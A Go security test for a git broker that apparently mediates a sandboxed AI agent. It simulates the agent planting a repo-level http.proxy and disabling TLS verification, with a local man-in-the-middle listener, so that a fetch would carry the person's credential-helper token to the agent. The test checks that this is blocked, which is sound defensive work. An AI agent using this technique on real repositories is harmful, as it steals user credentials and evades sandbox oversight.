package hostgit

import (
	"bufio"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

// A9: repo-level http.proxy + http.sslVerify=false hands the person's credential-helper token to the agent's listener.
func TestAttackProxyStealsCredential(t *testing.T) {
	r := newRemoteRig(t)
	var mu sync.Mutex
	var got []string
	ts := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, q *http.Request) {
		mu.Lock()
		got = append(got, q.Header.Get("Authorization"))
		mu.Unlock()
		if q.Header.Get("Authorization") == "" {
			w.Header().Set("WWW-Authenticate", `Basic realm="x"`)
			w.WriteHeader(401)
			return
		}
		w.WriteHeader(404)
	}))
	defer ts.Close()
	backend := strings.TrimPrefix(ts.URL, "https://")
	ln, _ := net.Listen("tcp", "127.0.0.1:0")
	defer ln.Close()
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go func(c net.Conn) {
				br := bufio.NewReader(c)
				for {
					l, err := br.ReadString('\n')
					if err != nil || l == "\r\n" {
						break
					}
				}
				b, err := net.Dial("tcp", backend)
				if err != nil {
					c.Close()
					return
				}
				io.WriteString(c, "HTTP/1.1 200 Connection established\r\n\r\n")
				go io.Copy(b, br)
				io.Copy(c, b)
				c.Close()
				b.Close()
			}(c)
		}
	}()
	// the person's own credential helper, in their global config
	gc := filepath.Join(r.home, ".gitconfig")
	f, _ := os.OpenFile(gc, os.O_APPEND|os.O_WRONLY, 0)
	f.WriteString("[credential]\n\thelper = \"!f() { echo username=person; echo password=SECRET-TOKEN-42; }; f\"\n")
	f.Close()
	run(t, r.ws, "remote", "set-url", "origin", "https://git.example/team/app.git")
	b := r.broker(Network{Open: true})
	// planted by the sandboxed agent mid-session: not in settingKeys? http. is -> asked each time
	run(t, r.ws, "config", "http.proxy", "http://"+ln.Addr().String())
	run(t, r.ws, "config", "http.sslVerify", "false")
	reason, step, _, err := b.Ask(r.key("c1"), r.ws, "git fetch")
	t.Logf("ask=%q step=%q err=%v", reason, step, err)
	out, err := runCmd(t, b.Command(r.ctx("c1"), r.ws, "git fetch"))
	t.Logf("fetch: %v\n%s", err, out)
	mu.Lock()
	defer mu.Unlock()
	t.Logf("server saw Authorization: %q", got)
	for _, a := range got {
		if a != "" {
			t.Errorf("PERSON'S CREDENTIAL REACHED AGENT-CHOSEN ENDPOINT: %s", a)
		}
	}
}
